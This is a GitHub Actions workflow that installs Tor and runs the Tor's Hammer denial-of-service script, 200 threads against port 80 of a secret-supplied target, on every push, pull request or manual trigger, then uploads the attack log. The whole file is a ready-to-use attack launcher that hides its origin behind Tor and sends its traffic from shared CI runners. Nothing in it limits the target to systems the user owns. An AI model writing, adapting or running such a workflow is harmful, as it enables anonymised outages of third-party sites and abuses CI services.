name: Tor's Hammer DoS Test

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:  # Manual run button

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10  # Prevent hanging

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.x'

    - name: Install dependencies
      run: |
        pip install pysocks requests
        sudo apt-get update -qq
        sudo apt-get install -y tor

    - name: Start Tor service
      run: |
        sudo service tor start
        echo "Waiting for Tor to start..."
        sleep 10
        # Verify Tor is running
        curl --socks5-hostname 127.0.0.1:9050 -s https://check.torproject.org/api/ip | grep -q '"IsTor":true' && echo "Tor is working!" || echo "Tor failed!"

    - name: Run Tor's Hammer
      run: |
        # Fail fast if no target
        if [ -z "${{ secrets.TEST_TARGET }}" ]; then
          echo "ERROR: TEST_TARGET secret not set!"
          echo "Go to Settings > Secrets > Actions and add TEST_TARGET with your domain/IP"
          exit 1
        fi

        echo "Starting attack on ${{ secrets.TEST_TARGET }}:80 with 200 threads via Tor..."
        python3 torshammer.py -s ${{ secrets.TEST_TARGET }} -p 80 -r 200 -T > hammer-attack.log 2>&1 || true

        echo "Attack completed. Log saved."
        cat hammer-attack.log

    - name: Upload Attack Log
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: torshammer-attack-log
        path: hammer-attack.log
        retention-days: 7
